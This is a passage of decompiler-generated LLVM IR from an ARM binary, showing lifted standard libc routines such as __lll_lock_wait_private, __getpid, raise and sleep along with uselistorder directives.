  uselistorder i32 %v1_12968.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_12958, { 1, 0 }
  uselistorder i32 %v0_127fc, { 1, 0, 2 }
  uselistorder i32 %v1_127e0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_127b8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_12790, { 1, 0, 2 }
  uselistorder i32 %v1_12774.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_1273c, { 1, 0, 2 }
  uselistorder i32 %v0_1271c, { 1, 0, 2 }
  uselistorder i32 %v1_12700.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 9, 8, 0, 10, 11, 12, 13, 15, 14, 1, 16, 17, 18, 19, 20, 21, 22, 24, 23, 2, 25, 26, 27, 29, 28, 3, 30, 31, 33, 32, 4, 34 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 13, 7, 8, 9, 11, 10, 2, 12, 14, 15, 17, 16, 3, 18, 19, 21, 20, 4, 22, 23, 25, 24, 5, 26, 27, 28, 30, 29, 6, 32, 31, 0 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_12a48, { 1, 0 }
  uselistorder label %dec_label_pc_12a3c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12a04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_129ec, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_12988, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12970, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_12800, { 2, 1, 0 }
  uselistorder label %dec_label_pc_127e8, { 1, 0 }
  uselistorder label %dec_label_pc_12794, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1277c, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_12720, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12708, { 1, 0 }
  uselistorder label %dec_label_pc_127a4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_126d4, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12a80 = load i32, i32* @r4, align 4
  store i32 %v3_12a80, i32* %stack_var_-16, align 4
  %v0_12a84 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12a84, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12a88

dec_label_pc_12a88:                               ; preds = %dec_label_pc_12b08.dec_label_pc_12a88_crit_edge, %entry
  %v0_12a8c = phi i32 [ %v0_12a8c.pre, %dec_label_pc_12b08.dec_label_pc_12a88_crit_edge ], [ %v0_12a84, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_12a8c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_12a9417 = inttoptr i32 %v0_12a8c to i32*
  %v2_12a9418 = load i32, i32* %v1_12a9417, align 4
  %v3_12a9820 = icmp ne i32 %v2_12a9418, 0
  store i1 %v3_12a9820, i1* %cpsr_c.global-to-local, align 1
  %v9_12a9826 = icmp eq i32 %v2_12a9418, 1
  br i1 %v9_12a9826, label %dec_label_pc_12aa0, label %dec_label_pc_12ab8

dec_label_pc_12aa0:                               ; preds = %dec_label_pc_12a88, %dec_label_pc_12aa0.dec_label_pc_12a94_crit_edge
  %v0_12aa027 = phi i32 [ %v1_12a98.pre, %dec_label_pc_12aa0.dec_label_pc_12a94_crit_edge ], [ 1, %dec_label_pc_12a88 ]
  store i32 %v0_12aa027, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_12ab0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12ab0, label %dec_label_pc_12ab4, label %dec_label_pc_12aa0.dec_label_pc_12a94_crit_edge

dec_label_pc_12aa0.dec_label_pc_12a94_crit_edge:  ; preds = %dec_label_pc_12aa0
  %v0_12a94.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12a98.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_12a94 = inttoptr i32 %v0_12a94.pre to i32*
  %v2_12a94 = load i32, i32* %v1_12a94, align 4
  %v3_12a98 = icmp uge i32 %v2_12a94, %v1_12a98.pre
  store i1 %v3_12a98, i1* %cpsr_c.global-to-local, align 1
  %v9_12a98 = icmp eq i32 %v2_12a94, %v1_12a98.pre
  br i1 %v9_12a98, label %dec_label_pc_12aa0, label %dec_label_pc_12ab8

dec_label_pc_12ab4:                               ; preds = %dec_label_pc_12aa0
  %v0_12ab4 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ab8

dec_label_pc_12ab8:                               ; preds = %dec_label_pc_12a88, %dec_label_pc_12aa0.dec_label_pc_12a94_crit_edge, %dec_label_pc_12ab4
  %v0_12ab8 = phi i32 [ %v0_12ab4, %dec_label_pc_12ab4 ], [ %v2_12a9418, %dec_label_pc_12a88 ], [ %v2_12a94, %dec_label_pc_12aa0.dec_label_pc_12a94_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12ab8 = icmp eq i32 %v0_12ab8, 0
  %v0_12adc.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_12ab8, label %dec_label_pc_12ad8, label %dec_label_pc_12ac0

dec_label_pc_12ac0:                               ; preds = %dec_label_pc_12ab8
  store i32 %v0_12adc.pre, i32* %r0.global-to-local, align 4
  %v0_12ac4 = load i32, i32* %r1.global-to-local, align 4
  %v1_12ac4 = add i32 %v0_12ac4, 126
  store i32 %v1_12ac4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12ad8

dec_label_pc_12ad8:                               ; preds = %dec_label_pc_12ab8, %dec_label_pc_12ac0
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_12adc.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_12ae428 = inttoptr i32 %v0_12adc.pre to i32*
  %v2_12ae429 = load i32, i32* %v1_12ae428, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_12ae836 = icmp eq i32 %v2_12ae429, 0
  br i1 %v9_12ae836, label %dec_label_pc_12af0, label %dec_label_pc_12b08

dec_label_pc_12af0:                               ; preds = %dec_label_pc_12ad8, %dec_label_pc_12af0.dec_label_pc_12ae4_crit_edge
  %v0_12af037 = phi i32 [ %v1_12ae8.pre, %dec_label_pc_12af0.dec_label_pc_12ae4_crit_edge ], [ 0, %dec_label_pc_12ad8 ]
  store i32 %v0_12af037, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_12b00 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12b00, label %dec_label_pc_12b04, label %dec_label_pc_12af0.dec_label_pc_12ae4_crit_edge

dec_label_pc_12af0.dec_label_pc_12ae4_crit_edge:  ; preds = %dec_label_pc_12af0
  %v0_12ae4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12ae8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_12ae4 = inttoptr i32 %v0_12ae4.pre to i32*
  %v2_12ae4 = load i32, i32* %v1_12ae4, align 4
  %v3_12ae8 = icmp uge i32 %v2_12ae4, %v1_12ae8.pre
  store i1 %v3_12ae8, i1* %cpsr_c.global-to-local, align 1
  %v9_12ae8 = icmp eq i32 %v2_12ae4, %v1_12ae8.pre
  br i1 %v9_12ae8, label %dec_label_pc_12af0, label %dec_label_pc_12b08

dec_label_pc_12b04:                               ; preds = %dec_label_pc_12af0
  %v0_12b04 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b08

dec_label_pc_12b08:                               ; preds = %dec_label_pc_12ad8, %dec_label_pc_12af0.dec_label_pc_12ae4_crit_edge, %dec_label_pc_12b04
  %v0_12b08 = phi i32 [ %v0_12b04, %dec_label_pc_12b04 ], [ %v2_12ae429, %dec_label_pc_12ad8 ], [ %v2_12ae4, %dec_label_pc_12af0.dec_label_pc_12ae4_crit_edge ]
  %v1_12b08 = phi i32 [ %v0_12b04, %dec_label_pc_12b04 ], [ 0, %dec_label_pc_12ad8 ], [ %v1_12ae8.pre, %dec_label_pc_12af0.dec_label_pc_12ae4_crit_edge ]
  %v3_12b08 = icmp uge i32 %v0_12b08, %v1_12b08
  store i1 %v3_12b08, i1* %cpsr_c.global-to-local, align 1
  %v9_12b08 = icmp eq i32 %v0_12b08, %v1_12b08
  br i1 %v9_12b08, label %dec_label_pc_12b10, label %dec_label_pc_12b08.dec_label_pc_12a88_crit_edge

dec_label_pc_12b08.dec_label_pc_12a88_crit_edge:  ; preds = %dec_label_pc_12b08
  %v0_12a8c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12a88

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12b08
  %v2_12b10 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12b10, i32* %r4.global-to-local, align 4
  %v1_12b14 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_12b14

; uselistorder directives
  uselistorder i32 %v0_12b04, { 1, 0 }
  uselistorder i32 %v1_12ae8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_12a98.pre, { 2, 1, 0 }
  uselistorder i32 %v2_12a9418, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12b08, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12af0, { 1, 0 }
  uselistorder label %dec_label_pc_12ad8, { 1, 0 }
  uselistorder label %dec_label_pc_12ab8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12aa0, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12b18 = load i32, i32* @r7, align 4
  store i32 %v3_12b18, i32* %stack_var_-8, align 4
  %v0_12b1c = call i32 @__aeabi_read_tp()
  store i32 %v0_12b1c, i32* %r0.global-to-local, align 4
  %v1_12b20 = add i32 %v0_12b1c, -1060
  %v2_12b20 = inttoptr i32 %v1_12b20 to i32*
  %v3_12b20 = load i32, i32* %v2_12b20, align 4
  %tmp7 = icmp slt i32 %v3_12b20, 1
  br i1 %tmp7, label %dec_label_pc_12b30, label %dec_label_pc_12b54

dec_label_pc_12b30:                               ; preds = %entry
  %v2_12b24 = icmp eq i32 %v3_12b20, 0
  br i1 %v2_12b24, label %dec_label_pc_12b34, label %dec_label_pc_12b40

dec_label_pc_12b34:                               ; preds = %dec_label_pc_12b30
  %v1_12b34 = add i32 %v0_12b1c, -1064
  %v2_12b34 = inttoptr i32 %v1_12b34 to i32*
  %v3_12b34 = load i32, i32* %v2_12b34, align 4
  store i32 %v3_12b34, i32* %r0.global-to-local, align 4
  %v2_12b38 = icmp eq i32 %v3_12b34, 0
  br i1 %v2_12b38, label %bb, label %bb8

dec_label_pc_12b40:                               ; preds = %dec_label_pc_12b30
  br label %bb8

bb:                                               ; preds = %dec_label_pc_12b34
  store i32 0, i32* %v2_12b34, align 4
  %v0_12b50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_12b40, %dec_label_pc_12b34, %bb
  %v0_12b50 = phi i32 [ %v3_12b34, %dec_label_pc_12b34 ], [ %v0_12b1c, %dec_label_pc_12b40 ], [ %v0_12b50.pre, %bb ]
  br label %dec_label_pc_12b54

dec_label_pc_12b54:                               ; preds = %entry, %bb8
  %v0_12b54 = phi i32 [ %v3_12b20, %entry ], [ %v0_12b50, %bb8 ]
  store i32 %v0_12b54, i32* %r0.global-to-local, align 4
  %v2_12b58 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12b58, i32* @r7, align 4
  ret i32 %v0_12b54

; uselistorder directives
  uselistorder i32 %v0_12b54, { 1, 0 }
  uselistorder i32 %v3_12b20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12b54, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12b60 = load i32, i32* @r4, align 4
  store i32 %v3_12b60, i32* %stack_var_-20, align 4
  %v0_12b68 = call i32 @__aeabi_read_tp()
  store i32 %v0_12b68, i32* %r0.global-to-local, align 4
  %v1_12b6c = add i32 %v0_12b68, -1064
  %v2_12b6c = inttoptr i32 %v1_12b6c to i32*
  %v3_12b6c = load i32, i32* %v2_12b6c, align 4
  store i32 %v3_12b6c, i32* %r4.global-to-local, align 4
  %v2_12b70 = icmp eq i32 %v3_12b6c, 0
  %v1_12b78 = add i32 %v0_12b68, -1060
  %v2_12b78 = inttoptr i32 %v1_12b78 to i32*
  %v3_12b78 = load i32, i32* %v2_12b78, align 4
  store i32 %v3_12b78, i32* %r0.global-to-local, align 4
  br i1 %v2_12b70, label %dec_label_pc_12b80, label %dec_label_pc_12b94

dec_label_pc_12b80:                               ; preds = %entry
  store i32 %v3_12b78, i32* %r4.global-to-local, align 4
  store i32 %v3_12b78, i32* %v2_12b6c, align 4
  %v0_12bbc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_12b94:                               ; preds = %entry
  %v5_12b98 = icmp sgt i32 %v3_12b78, 0
  br i1 %v5_12b98, label %bb28, label %dec_label_pc_12b9c

dec_label_pc_12b9c:                               ; preds = %dec_label_pc_12b94
  %tmp = bitcast i32 %v3_12b78 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_12b9c = bitcast float %tmp30 to i32
  %v2_12ba0 = icmp eq i32 %v1_12b9c, 0
  br i1 %v2_12ba0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12b9c
  store i32 %v3_12b6c, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_12b9c
  %v2_12ba8 = sub i32 0, %v3_12b78
  store i32 %v2_12ba8, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_12b94, %dec_label_pc_12b80, %.thread
  %v0_12bc0 = phi i32 [ %v3_12b78, %dec_label_pc_12b94 ], [ %v0_12bbc.pre, %dec_label_pc_12b80 ], [ %v3_12b6c, %bb ], [ %v2_12ba8, %.thread ]
  store i32 %v0_12bc0, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_12bc0, -4095
  br i1 %tmp31, label %dec_label_pc_12be4, label %dec_label_pc_12bcc

dec_label_pc_12bcc:                               ; preds = %bb28
  %v0_12bd0 = call i32 @__aeabi_read_tp()
  %v3_12bd4 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_12bd4 = sext i16 %v3_12bd4 to i32
  %v0_12bd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12bd8 = sub i32 0, %v0_12bd8
  store i32 %v1_12bd8, i32* %r2.global-to-local, align 4
  %v3_12bdc = add i32 %v4_12bd4, %v0_12bd0
  %v4_12bdc = inttoptr i32 %v3_12bdc to i32*
  store i32 %v1_12bd8, i32* %v4_12bdc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12be4

dec_label_pc_12be4:                               ; preds = %bb28, %dec_label_pc_12bcc
  %v0_12be8 = phi i32 [ %v0_12bc0, %bb28 ], [ -1, %dec_label_pc_12bcc ]
  %v3_12be4 = icmp eq i32 %v0_12be8, -1
  store i32 %v0_12be8, i32* %r5.global-to-local, align 4
  br i1 %v3_12be4, label %dec_label_pc_12bf0, label %dec_label_pc_12c38

dec_label_pc_12bf0:                               ; preds = %dec_label_pc_12be4
  %v0_12bf4 = call i32 @__aeabi_read_tp()
  store i32 %v0_12bf4, i32* %r0.global-to-local, align 4
  %v3_12bf8 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_12bf8 = sext i16 %v3_12bf8 to i32
  %v2_12bfc = add i32 %v4_12bf8, %v0_12bf4
  %v3_12bfc = inttoptr i32 %v2_12bfc to i32*
  %v4_12bfc = load i32, i32* %v3_12bfc, align 4
  %v7_12c00 = icmp eq i32 %v4_12bfc, 38
  br i1 %v7_12c00, label %dec_label_pc_12c0c, label %dec_label_pc_12bf0.dec_label_pc_12c38_crit_edge

dec_label_pc_12bf0.dec_label_pc_12c38_crit_edge:  ; preds = %dec_label_pc_12bf0
  %v0_12c38.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12c38

dec_label_pc_12c0c:                               ; preds = %dec_label_pc_12bf0
  %v0_12c0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12c0c, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_12c0c, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_12c0c
  %v5_12c24 = sub i32 0, %v0_12c0c
  store i32 %v5_12c24, i32* %r2.global-to-local, align 4
  %v7_12c28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_12c30.738 to i32), i32 57660) to i32*), align 4
  %v4_12c2c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_12c2c, i32* %r0.global-to-local, align 4
  %v7_12c30 = add i32 %v7_12c28, %v0_12bf4
  %v8_12c30 = inttoptr i32 %v7_12c30 to i32*
  store i32 %v5_12c24, i32* %v8_12c30, align 4
  %v0_12c34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_12c0c, %bb29
  %v0_12c34 = phi i32 [ %v0_12c34.pre, %bb29 ], [ %v0_12c0c, %dec_label_pc_12c0c ]
  store i32 %v0_12c34, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12c38

dec_label_pc_12c38:                               ; preds = %dec_label_pc_12bf0.dec_label_pc_12c38_crit_edge, %dec_label_pc_12be4, %.thread22
  %v0_12c38 = phi i32 [ %v0_12c38.pre, %dec_label_pc_12bf0.dec_label_pc_12c38_crit_edge ], [ %v0_12be8, %dec_label_pc_12be4 ], [ %v0_12c34, %.thread22 ]
  store i32 %v0_12c38, i32* %r0.global-to-local, align 4
  %v2_12c3c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12c3c, i32* @r4, align 4
  ret i32 %v0_12c38

; uselistorder directives
  uselistorder i32 %v0_12c38, { 1, 0 }
  uselistorder i32 %v0_12c0c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12bc0, { 2, 0, 1 }
  uselistorder i32 %v3_12b78, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_12c38, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_12be4, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_12c50 = load i32, i32* @r4, align 4
  %v6_12c50 = load i32, i32* @r5, align 4
  %v9_12c50 = load i32, i32* @r6, align 4
  %v12_12c50 = load i32, i32* @r7, align 4
  %v15_12c50 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12c60 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_12c60, label %dec_label_pc_12c74, label %dec_label_pc_12ce8

dec_label_pc_12c74:                               ; preds = %entry
  %v0_12c74 = call i32 @__aeabi_read_tp()
  %v1_12c78 = add i32 %v0_12c74, -1036
  %v2_12c78 = inttoptr i32 %v1_12c78 to i32*
  %v3_12c78 = load i32, i32* %v2_12c78, align 4
  %v1_12c7c = and i32 %v3_12c78, -71
  %v2_12c80 = icmp ugt i32 %v1_12c7c, 7
  store i1 %v2_12c80, i1* %cpsr_c.global-to-local, align 1
  %v7_12c80 = icmp eq i32 %v1_12c7c, 8
  %v1_12c84 = add i32 %v0_12c74, -1168
  store i32 %v1_12c84, i32* @r5, align 4
  br i1 %v7_12c80, label %dec_label_pc_12c8c, label %dec_label_pc_12d60

dec_label_pc_12c8c:                               ; preds = %dec_label_pc_12c74
  %v2_12c90 = add i32 %v0_12c74, -624
  %v3_12c90 = inttoptr i32 %v2_12c90 to i32*
  store i32 -1, i32* %v3_12c90, align 4
  %v0_12c94 = load i32, i32* @r5, align 4
  %v1_12c94 = add i32 %v0_12c94, 132
  store i32 %v1_12c94, i32* @r6, align 4
  br label %dec_label_pc_12c98

dec_label_pc_12c98:                               ; preds = %dec_label_pc_12ccc.dec_label_pc_12c98_crit_edge, %dec_label_pc_12c8c
  %v0_12c9c = phi i32 [ %v0_12c9c.pre, %dec_label_pc_12ccc.dec_label_pc_12c98_crit_edge ], [ %v1_12c94, %dec_label_pc_12c8c ]
  %v0_12c98 = phi i32 [ %v0_12cd4, %dec_label_pc_12ccc.dec_label_pc_12c98_crit_edge ], [ %v0_12c94, %dec_label_pc_12c8c ]
  %v1_12c98 = add i32 %v0_12c98, 132
  %v2_12c98 = inttoptr i32 %v1_12c98 to i32*
  %v3_12c98 = load i32, i32* %v2_12c98, align 4
  store i32 %v0_12c9c, i32* %r2.global-to-local, align 4
  store i32 %v3_12c98, i32* @r4, align 4
  %v1_12ca830 = inttoptr i32 %v0_12c9c to i32*
  %v2_12ca831 = load i32, i32* %v1_12ca830, align 4
  %v3_12cac33 = icmp uge i32 %v2_12ca831, %v3_12c98
  store i1 %v3_12cac33, i1* %cpsr_c.global-to-local, align 1
  %v9_12cac39 = icmp eq i32 %v2_12ca831, %v3_12c98
  br i1 %v9_12cac39, label %dec_label_pc_12cb4, label %dec_label_pc_12ccc

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12c98, %dec_label_pc_12cb4.dec_label_pc_12ca8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_12cc4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12cc4, label %dec_label_pc_12cc8, label %dec_label_pc_12cb4.dec_label_pc_12ca8_crit_edge

dec_label_pc_12cb4.dec_label_pc_12ca8_crit_edge:  ; preds = %dec_label_pc_12cb4
  %v0_12ca8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12cac.pre = load i32, i32* @r4, align 4
  %v1_12ca8 = inttoptr i32 %v0_12ca8.pre to i32*
  %v2_12ca8 = load i32, i32* %v1_12ca8, align 4
  %v3_12cac = icmp uge i32 %v2_12ca8, %v1_12cac.pre
  store i1 %v3_12cac, i1* %cpsr_c.global-to-local, align 1
  %v9_12cac = icmp eq i32 %v2_12ca8, %v1_12cac.pre
  br i1 %v9_12cac, label %dec_label_pc_12cb4, label %dec_label_pc_12ccc

dec_label_pc_12cc8:                               ; preds = %dec_label_pc_12cb4
  %v0_12cc8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_12ccc

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12c98, %dec_label_pc_12cb4.dec_label_pc_12ca8_crit_edge, %dec_label_pc_12cc8
  %v0_12ccc = phi i32 [ %v0_12cc8, %dec_label_pc_12cc8 ], [ %v2_12ca831, %dec_label_pc_12c98 ], [ %v2_12ca8, %dec_label_pc_12cb4.dec_label_pc_12ca8_crit_edge ]
  %v1_12ccc = phi i32 [ %v0_12cc8, %dec_label_pc_12cc8 ], [ %v3_12c98, %dec_label_pc_12c98 ], [ %v1_12cac.pre, %dec_label_pc_12cb4.dec_label_pc_12ca8_crit_edge ]
  %v3_12ccc = icmp uge i32 %v0_12ccc, %v1_12ccc
  store i1 %v3_12ccc, i1* %cpsr_c.global-to-local, align 1
  %v9_12ccc = icmp eq i32 %v0_12ccc, %v1_12ccc
  br i1 %v9_12ccc, label %dec_label_pc_12cd4, label %dec_label_pc_12ccc.dec_label_pc_12c98_crit_edge

dec_label_pc_12ccc.dec_label_pc_12c98_crit_edge:  ; preds = %dec_label_pc_12ccc
  %v0_12cd4 = load i32, i32* @r5, align 4
  %v0_12c9c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12c98

dec_label_pc_12cd4:                               ; preds = %dec_label_pc_12ccc
  %v0_12cdc = load i32, i32* @r7, align 4
  %v2_12cdc = add i32 %v0_12cdc, 116
  %v3_12cdc = inttoptr i32 %v2_12cdc to i32*
  %v4_12cdc = load i32, i32* %v3_12cdc, align 4
  store i32 77032, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12cdc)
  %v0_12cf0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12ce8

dec_label_pc_12ce8:                               ; preds = %entry, %dec_label_pc_12cd4
  %v0_12cf0 = phi i32 [ 0, %entry ], [ %v0_12cf0.pre, %dec_label_pc_12cd4 ]
  %v2_12cf4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_12cf4, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_12d00 = call i32 @__libc_sigaction(i32 17, i32 %v0_12cf0, i32 %v2_12cf4)
  %v3_12d04 = load i32, i32* %stack_var_-60, align 4
  %v2_12d08 = icmp ne i32 %v3_12d04, 0
  store i1 %v2_12d08, i1* %cpsr_c.global-to-local, align 1
  %v7_12d08 = icmp eq i32 %v3_12d04, 1
  br i1 %v7_12d08, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12ce8
  %v3_12d0c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_12d0c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12ce8, %bb
  call void @__pseudo_cond_branch(i1 %v7_12d08, i32 ptrtoint (i32* @global_var_10094.742 to i32))
  %v2_12d1c = ptrtoint i32* %stack_var_-32 to i32
  %v2_12d24 = call i32 @__libc_nanosleep(i32 %v2_12d1c, i32 %v2_12d1c)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12d28 = icmp eq i32 %v2_12d24, 0
  br i1 %v2_12d28, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_12d3c = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_12d3c, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_12d4c = load i32, i32* %stack_var_-40, align 4
  %v1_12d50 = and i32 %v3_12d4c, 65536
  store i32 %v1_12d50, i32* %r2.global-to-local, align 4
  %v2_12d50 = icmp eq i32 %v1_12d50, 0
  br i1 %v2_12d50, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_12d58 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_12d58, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_12d50, i32 ptrtoint (i32* @global_var_10094.742 to i32))
  br label %dec_label_pc_12d60

dec_label_pc_12d60:                               ; preds = %dec_label_pc_12c74, %.thread5
  %v0_12d60 = load i32, i32* @r4, align 4
  store i32 %v3_12c50, i32* @r4, align 4
  store i32 %v6_12c50, i32* @r5, align 4
  store i32 %v9_12c50, i32* @r6, align 4
  store i32 %v12_12c50, i32* @r7, align 4
  store i32 %v15_12c50, i32* @lr, align 4
